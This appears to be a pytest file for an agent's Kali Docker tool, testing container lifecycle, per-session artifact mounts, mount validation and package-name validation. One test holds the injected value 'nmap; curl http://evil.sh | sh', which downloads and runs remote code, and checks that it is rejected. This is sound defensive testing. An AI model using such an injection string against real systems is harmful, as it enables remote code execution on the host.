"""Tests for Kali Docker tool (requires Docker daemon)."""

import shutil
from unittest.mock import MagicMock

import pytest

from clearwing.agent.tooling import session_scope

docker_available = shutil.which("docker") is not None

try:
    import docker as docker_lib

    client = docker_lib.from_env()
    client.ping()
    docker_running = True
except Exception:
    docker_lib = None
    docker_running = False

skip_no_docker = pytest.mark.skipif(
    not (docker_available and docker_running), reason="Docker daemon not available"
)


@skip_no_docker
class TestKaliDocker:
    """Integration tests using alpine image for speed."""

    @pytest.fixture(autouse=True)
    def cleanup(self):
        """Cleanup any leftover test containers."""
        yield
        try:
            client = docker_lib.from_env()
            try:
                container = client.containers.get("clearwing-kali-test")
                container.stop(timeout=2)
                container.remove()
            except docker_lib.errors.NotFound:
                pass
        except Exception:
            pass

    def test_container_lifecycle(self):
        """Test start, execute, cleanup using alpine."""

        client = docker_lib.from_env()

        # Use alpine instead of kali for test speed
        container = client.containers.run(
            "alpine:latest",
            command="sleep 300",
            name="clearwing-kali-test",
            detach=True,
        )

        try:
            assert container.status in ("running", "created")

            # Execute a command
            exit_code, output = container.exec_run("echo hello")
            assert exit_code == 0
            assert b"hello" in output

            # Stop and remove
            container.stop(timeout=2)
            container.remove()

            # Verify removed
            with pytest.raises(docker_lib.errors.NotFound):
                client.containers.get("clearwing-kali-test")
        except Exception:
            # Cleanup on failure
            try:
                container.stop(timeout=2)
                container.remove()
            except Exception:
                pass
            raise

    def test_container_reuse(self):
        """Test that existing containers are reused."""
        client = docker_lib.from_env()

        container = client.containers.run(
            "alpine:latest",
            command="sleep 300",
            name="clearwing-kali-test",
            detach=True,
        )

        try:
            # Getting same container by name should return same ID
            same = client.containers.get("clearwing-kali-test")
            assert same.id == container.id
        finally:
            container.stop(timeout=2)
            container.remove()


class _FakeContainerAPI:
    """Stands in for docker client.containers without a daemon."""

    def __init__(self, existing=None):
        self.existing = existing
        self.run_calls: list[dict] = []

    def get(self, name):
        if self.existing is None:
            import docker

            raise docker.errors.NotFound(f"no container {name}")
        return self.existing

    def run(self, *args, **kwargs):
        self.run_calls.append({"args": args, "kwargs": kwargs})
        container = MagicMock()
        container.id = "abc123def456789"
        container.short_id = "abc123def456"
        return container


def _fake_docker(monkeypatch, containers):
    import docker

    client = MagicMock()
    client.containers = containers
    client.images.get = MagicMock()  # image already present
    monkeypatch.setattr(docker, "from_env", lambda: client)
    return client


class TestKaliArtifactsMount:
    """Unit tests for the artifacts bind-mount (issue #13), daemon-free."""

    def test_setup_mounts_session_artifacts_dir(self, tmp_path, monkeypatch):
        """A fresh container bind-mounts the session artifacts dir at /artifacts."""
        from clearwing.agent.tools.ops import kali_docker_tool

        monkeypatch.setenv("CLEARWING_HOME", str(tmp_path))
        containers = _FakeContainerAPI(existing=None)
        _fake_docker(monkeypatch, containers)

        with session_scope("abcd1234extra"):
            result = kali_docker_tool.kali_setup()

        assert result["status"] == "created"
        assert result["artifacts_mount"] == "/artifacts"
        expected_dir = tmp_path / "kali" / "abcd1234extra" / "artifacts"
        assert result["artifacts_dir"] == str(expected_dir)
        assert expected_dir.is_dir(), "host artifacts dir must be created"

        assert len(containers.run_calls) == 1
        kwargs = containers.run_calls[0]["kwargs"]
        assert kwargs["name"] == "clearwing-kali-abcd1234extra"
        assert kwargs["volumes"] == {
            str(expected_dir): {"bind": "/artifacts", "mode": "rw"}
        }
        # The mount is the persistence contract — dropping it regresses #13.
        assert "volumes" in kwargs

    def test_setup_reuses_running_container(self, tmp_path, monkeypatch):
        """A running session container is reused without a new run()."""
        from clearwing.agent.tools.ops import kali_docker_tool

        monkeypatch.setenv("CLEARWING_HOME", str(tmp_path))
        existing = MagicMock()
        existing.status = "running"
        existing.id = "existing-id"
        existing.short_id = "existing"
        existing.attrs = {
            "Mounts": [
                {
                    "Destination": "/artifacts",
                    "Type": "bind",
                    "RW": True,
                    "Source": str(tmp_path / "kali" / "reuse-sess1" / "artifacts"),
                }
            ]
        }
        containers = _FakeContainerAPI(existing=existing)
        _fake_docker(monkeypatch, containers)

        with session_scope("reuse-sess1"):
            result = kali_docker_tool.kali_setup()

        assert result["status"] == "reused"
        assert result["container_id"] == "existing-id"
        assert containers.run_calls == []
        assert result["artifacts_mount"] == "/artifacts"

    def test_setup_reuse_without_mount_reports_degraded(self, tmp_path, monkeypatch):
        """Issue #13 guard: a legacy container without the bind mount must
        not promise artifact persistence it cannot deliver."""
        from clearwing.agent.tools.ops import kali_docker_tool

        monkeypatch.setenv("CLEARWING_HOME", str(tmp_path))
        existing = MagicMock()
        existing.status = "running"
        existing.id = "legacy-id"
        existing.short_id = "legacy"
        existing.attrs = {"Mounts": []}
        containers = _FakeContainerAPI(existing=existing)
        _fake_docker(monkeypatch, containers)

        result = kali_docker_tool.kali_setup()

        assert result["status"] == "reused"
        assert result["artifacts_mount"] is None
        assert "LEGACY" in result["message"]

    def test_setup_without_session_uses_legacy_scope(self, tmp_path, monkeypatch):
        """Session-less callers keep the shared container name and adhoc dir."""
        from clearwing.agent.tools.ops import kali_docker_tool

        monkeypatch.setenv("CLEARWING_HOME", str(tmp_path))
        containers = _FakeContainerAPI(existing=None)
        _fake_docker(monkeypatch, containers)

        result = kali_docker_tool.kali_setup()

        assert result["status"] == "created"
        kwargs = containers.run_calls[0]["kwargs"]
        assert kwargs["name"] == "clearwing-kali"
        expected_dir = tmp_path / "kali" / "adhoc" / "artifacts"
        assert result["artifacts_dir"] == str(expected_dir)
        assert kwargs["volumes"][str(expected_dir)]["bind"] == "/artifacts"

    def test_sessions_do_not_share_containers(self, tmp_path, monkeypatch):
        """Different sessions get different container names and artifact dirs."""
        from clearwing.agent.tools.ops import kali_docker_tool

        monkeypatch.setenv("CLEARWING_HOME", str(tmp_path))
        containers = _FakeContainerAPI(existing=None)
        _fake_docker(monkeypatch, containers)

        with session_scope("aaaa1111"):
            kali_docker_tool.kali_setup()
        with session_scope("bbbb2222"):
            kali_docker_tool.kali_setup()

        names = [call["kwargs"]["name"] for call in containers.run_calls]
        assert names == ["clearwing-kali-aaaa1111", "clearwing-kali-bbbb2222"]


class TestKaliInstallValidation:
    """Issue #17 review: package names reach a shell command — validate."""

    def test_metacharacters_rejected_before_any_docker_call(self, monkeypatch):
        from clearwing.agent.tools.ops import kali_docker_tool

        called = []
        monkeypatch.setattr(
            "docker.from_env", lambda: called.append("from_env") or MagicMock()
        )
        result = kali_docker_tool.kali_install_tool(
            "abc", "nmap; curl http://evil.sh | sh"
        )
        assert result["exit_code"] == -2
        assert called == []  # rejected before touching docker

    def test_plain_package_names_accepted(self, monkeypatch):
        from clearwing.agent.tools.ops import kali_docker_tool

        client = MagicMock()
        container = MagicMock()
        container.exec_run.return_value = (0, b"ok")
        client.containers.get.return_value = container
        monkeypatch.setattr("docker.from_env", lambda: client)

        # Approve the interrupt so the install proceeds. interrupt is
        # imported into the tool module's namespace, so patch it there.
        monkeypatch.setattr(
            "clearwing.agent.tools.ops.kali_docker_tool.interrupt", lambda prompt: True
        )
        result = kali_docker_tool.kali_install_tool("abc", "nmap nikto")
        assert result["exit_code"] == 0
        cmd = container.exec_run.call_args[0][0]
        assert "nmap nikto" in cmd


class TestArtifactsMountValidation:
    """Codex PR-55 r2: a /artifacts mount only counts when it is a writable
    bind from THIS session's artifact dir."""

    def _mount(self, **overrides):
        mount = {
            "Destination": "/artifacts",
            "Type": "bind",
            "RW": True,
            "Source": "/tmp/expected/artifacts",
        }
        mount.update(overrides)
        return mount

    def _container(self, mount):
        container = MagicMock()
        container.attrs = {"Mounts": [mount]}
        return container

    def test_writable_bind_from_expected_source_is_usable(self):
        from clearwing.agent.tools.ops.kali_docker_tool import _has_artifacts_mount

        assert _has_artifacts_mount(
            self._container(self._mount()), "/tmp/expected/artifacts"
        )

    def test_named_volume_is_rejected(self):
        from clearwing.agent.tools.ops.kali_docker_tool import _has_artifacts_mount

        assert not _has_artifacts_mount(
            self._container(self._mount(Type="volume")), "/tmp/expected/artifacts"
        )

    def test_read_only_mount_is_rejected(self):
        from clearwing.agent.tools.ops.kali_docker_tool import _has_artifacts_mount

        assert not _has_artifacts_mount(
            self._container(self._mount(RW=False)), "/tmp/expected/artifacts"
        )

    def test_foreign_source_is_rejected(self):
        from clearwing.agent.tools.ops.kali_docker_tool import _has_artifacts_mount

        assert not _has_artifacts_mount(
            self._container(self._mount(Source="/other/home/artifacts")),
            "/tmp/expected/artifacts",
        )
